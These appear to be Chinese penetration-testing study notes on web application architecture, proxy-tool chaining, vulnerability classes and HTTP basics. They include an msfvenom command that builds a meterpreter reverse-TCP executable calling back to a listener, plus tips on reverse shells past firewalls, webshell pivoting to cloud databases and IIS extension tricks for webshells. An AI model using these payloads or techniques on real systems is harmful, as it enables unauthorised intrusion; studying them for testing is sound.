---
title: 基础概念
---

## Web应用

### 组成模型

源码（脚本类型、应用方向）

操作系统

中间件（操作平台）

数据库

### 域名

**数据传输时对计算机的定位标识**

根据网站搭建的不同，访问不同的端口或目录可能指向不同的内容

- 主站
- 分站
- 端口站
- 目录站
- 子站

二级域名

- 意义：
  - 收集多级域名为安全测试提供更多的测试点
  - 由旁站进主站

#### DNS

**域名和IP地址相互映射的一个分布式数据库**

域名与IP地址的相互转换（ping命令）

本地hosts：重定向解析IP地址（首先解析本地是否有指定域名的IP地址）

### 源码差异

- 目录结构

  - 功能目录
  - 逻辑目录
  - 数据目录
  - 配置文件
  - 后台目录

- 开发语言

  - 针对不同语言的漏洞

- 开发组件

  - PHP：Thinkphp Laravel YII CodeIgniter CakePHP Zend等

    JAVA：Spring MyBatis Hibernate Struts2 Springboot等

    Python：Django Flask Bottle Turbobars Tornado Web2py等

    Javascript：Vue.js Node.js Bootstrap JQuery Angular等	

- 开源、闭源、源码加密

- 封装打包、反编译

  - JAVA、.NET

### 数据库搭建差异

- 网站本地搭建（同域名）

- 站库分离（不同域名）
- 云数据库 RDS
  - 加入白名单的网站本地域名才能连接
  - 拿到了一个网站的webshell，并且获得了数据库账号密码，但无法连接数据库怎么办？
    1. 假设数据库可访问，即便获得数据库账号密码也不能用本地真机去连接云数据库，所以可以上传一个数据库连接脚本，访问脚本通过网站域名连接数据库
    2. 利用网络权限上传代理流量工具，通过数据中转连接数据库

### 平台差异

- 操作系统系统
- 容器
  - 虚拟机 -- docker逃逸
- 中间件

### 解析差异

- 相对/绝对路径
- 格式权限
  - 网站支持/可执行的脚本语言
  - 限制文件/目录权限
    - 更换到已知路径的其它可执行的目录
- URL路由
  - MVC模型
  - 不同框架对应的路由可能不同



### web搭建

- 模板套用
  - 测试用户管理权限

- 前后端分离
  - 前端编写模板
  - 后端传输数据
  - JS漏洞、XSS和API接口测试
- 软件集成
  - 宝塔：权限限制高，一般只能看到默认web目录，要进行绕过
  - phpstudy

- 镜像环境
  - 默认有一般的用户权限，直接进行后续的提权或横向
- 容器拉取(docker)
  - 虚拟的磁盘空间，需要先逃逸提权
- 静态页面
  - 无web漏洞，寻找其它资产

### 安全架构

#### WAF

web漏洞防火墙

雷池WAF

#### CDN

- 内容分发服务，提高各地区的访问速度
- 影响：隐藏真实的源IP，测试ip错误

#### OSS

- 作用：对象存储服务，(Object Storage Service)，一种云存储服务
- 影响：防护文件上传漏洞，只能查看或下载，不能解析文件
- 漏洞：AK/SK泄露

#### 反向代理

- 作用：将代理内容反向转发给客户端
- 影响：功能点并不是目标服务端的，而是其它提供的，也就是测试功能点和测试目标不符

#### 负载均衡

- 作用：分摊到多个操作单元，共同执行任务，提高稳定、平摊风险
- 影响：有多个服务器加载服务，存在多个测试目标

### 拓展应用

#### 蜜罐

用于收集攻击者信息并尝试溯源反制的陷阱

#### 堡垒机

安全运维系统，存放工具的密码凭证

能接触到的Web应用都可用于测试

#### API

**封装的，可调用的功能模块**

- 内部API：Web应用提供给测试人员一个能获取到价值信息的接口

- 外部API：可以借助提供的API获取到当前网站不想让你获取的信息
- 分析API的目录结构、接口命名规则、参数命名规则、功能和业务逻辑等，根据这些信息可以进行接口枚举和参数枚举，进而可以进行相关的漏洞测试。

## APP应用

### 原生开发

安卓使用JAVA开发

- 多维手段获取资产信息

  - 使用NP管理器反编译源码获取资产

  - 抓包获取web信息，测试资产

- 逆向分析逻辑设计安全

### H5开发

- API
- JS测试

#### 微信小程序

### Web封装

- 将网站封装为APP应用
- web安全测试

## 漏洞分类

### 源码类

sql注入、文件上传、XSS、代码执行、变量覆盖、逻辑漏洞、反序列化

### 系统层

提权，远程代码执行

### 中间件

未授权访问，变量覆盖，

### 数据库

弱口令，权限提升...

### 第三方

### APP或PC结合

## 抓包技术

### 工具

- BurpSuite
- Reqable
- Yakit

#### 工具联动

- 意义：让一个数据包同时经过不同安全测试工具进行扫描
- 步骤：上游监听端口再将数据逐级给到下级监听端口

Burp->Yakit 

1、Burp 127.0.0.1:8080 (Network -> Connections -> Upstream proxy servers)

2、Yakit 127.0.0.1:8083

3、让Burp将给到Yakit

4、系统的代理设置：127.0.0.1:8080

 

Yakit->Burp

1、Yakit 127.0.0.1:8083 

2、设置下游 127.0.0.1:8080

3、Burp 127.0.0.1:8080 

4、系统的代理设置：127.0.0.1:8083

 

Burp->Yakit->Reqable

1、Burp 127.0.0.1:8080

2、Yakit 127.0.0.1:8083

3、让Burp将给到Yakit

4、系统的代理设置：127.0.0.1:8080

5、Yakit设置下游 127.0.0.1:9000



联动vpn

代理工具burp -> vpn

### PC端应用

- 有代理设置走代理设置

- 没有代理设置走联动转发
  - proxifier联动

### APP应用

1、无防护-模拟器直接抓包

2、有防护-真机绕过&更改内核

3、有防护-证书绕过&代理绕

### 全局协议抓包

WireShark 科来网络系统

1、解决部分代理校验

有部分的app web 小程序 当设置了代理后无法抓包

校验：检测到了当前机器的代理设置 做了一个策略防止，也就是在模拟器中做了代理

做了代理的设置数据走向：本身应用-代理-还没有到网卡-给到监听抓包工具

没有做代理的数据走向：本身应用-服务器（**网卡抓包**） 代理是在网卡之前产生

2、APP/小程序/PC应用

由于应用类型不同，不是说所有的应用都有**https**协议的数据

3、蓝队分析TCP/UDP应用

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.9 lport=6666 -f exe -o 9.exe

## 反弹shell

解决无回显及交互问题

向靶机传入反弹shell命令，然后主机监听，最后在主机上进行命令的交互回显

### 防火墙绕过

入站检测严格，出站检测宽松，所以可以通过反弹shell，反向连接（让靶机主动连接主机），将外部传入的命令变为内部执行

## 数据包

### Request

#### 请求行

请求方法、请求 URL 和 HTTP 版本

#### 请求头

由关键字/值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。

HOST: 主机或域名地址

Accept：指浏览器或其他客户可以接爱的 MIME 文件格式。Servlet 可以根据它判断并返回适当的文件格式。

User-Agent：是客户浏览器名称

Host：对应网址 URL 中的 Web 名称和端口号。

Accept-Langeuage：指出浏览器可以接受的语言种类，如 en 或 en-us，指英语。

connection：用来告诉服务器是否可以维持固定的 HTTP 连接。http 是无连接的，HTTP/1.1 使用 Keep-Alive为默认值，这样，当浏览器需要多个文件时(比如一个 HTML 文件和相关的图形文件)，不需要每次都建立连接

Cookie：浏览器用这个属性向服务器发送 Cookie。Cookie 是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能。

Referer ： 表 明 产 生 请 求 的 网 页 URL 。 

Content-Type：用来表名 request 的内容类型。可以用 HttpServletRequest 的 getContentType()方法取得。

Accept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-8859-1.

Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到 Web 响应之后先解码，然后再检查文件格式。

#### 空行

#### 请求数据

使用 POST 传送，最常使用的是 Content-Type 和 Content-Length 头标。

### Response

#### 状态行

协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔

#### 响应头

包含服务器类型、日期、长度、内容类型等

#### 空行

#### 响应数据



#### HTTP状态码

1xx：信息，请求收到，继续处理
2xx：成功，行为被成功地接受、理解和采纳
3xx：重定向，为了完成请求，必须进一步执行的动作
4xx：客户端错误
5xx：服务器错误

## 网站搭建 

### IIS

域名指向设置（根目录下）目录，IP指向默认（根）目录（访问网站的上级目录，可以扫描到更多文件）

网站内文件拓展名也可自主搭建（文件执行路径决定拓展名可解析的文件类型）如一句话木马通过修改可解析的后缀名来绕过

**WEB 源码中敏感文件**

- 后台路径，数据库配置文件，备份文件等

### 后门注意事项

设置后门后能否通过相应权限达到目的

- 后门是否给予执行权限
- 后门是否给予操作目录或文件权限
- 后门是否给予其他用户权限

可通过寻找有权限的目录进行绕过

### 中间件

## web源码

### 目录结构

后台

模板

数据库

数据库配置文件

### 脚本类型

### 应用分类

源码功能决定漏洞类型

### 补充

框架或非框架

**CMS识别**

开源或内部

源码获取

## 加密算法

AES、url、base64、

### 特性

长度位数

字符规律

代码分析

搜索获取

### 解密方式

枚举

自定义逆向算法

可逆向

### 注意

找注入点的时候注意payload是否需要经过加密（当网站源码有解密时）
